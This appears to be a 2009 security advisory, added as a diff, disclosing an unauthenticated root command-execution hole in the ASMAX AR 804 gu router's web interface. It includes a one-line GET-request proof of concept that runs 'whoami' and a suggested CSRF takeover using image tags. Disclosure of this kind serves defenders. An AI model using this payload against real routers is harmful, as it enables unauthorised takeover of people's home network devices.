@@ -1,0 +1,22 @@
+1. ASMAX 804 gu router is a SOHO class device. It provides ADSL / WiFi / Ethernet interfaces.
+
+2. There is an *unauthenticated* maintenance script (named 'script') in /cgi-bin/ directory of the web management interface.
+
+3. When 'system' paramether is passed to the script it allows running OS shell commands (as root).
+
+4. PoC:
+GET request to:
+http://192.168.1.1/cgi-bin/script?system%20whoami
+
+Returns:
+root
+
+5. Using CSRF attack one could remotely own a router using for example simple <img> html tags pointing to http://192.168.1.1/...
+
+6. The issue was tested on firmware: 66.34.1
+
+7. The vendor was notified on 30.12.08, but we got no reasonable response till now (the bug remains unpatched).
+
+8. More information: http://www.securitum.pl/dh/asmax-ar-804-gu-compromise
+
+# milw0rm.com [2009-06-01]
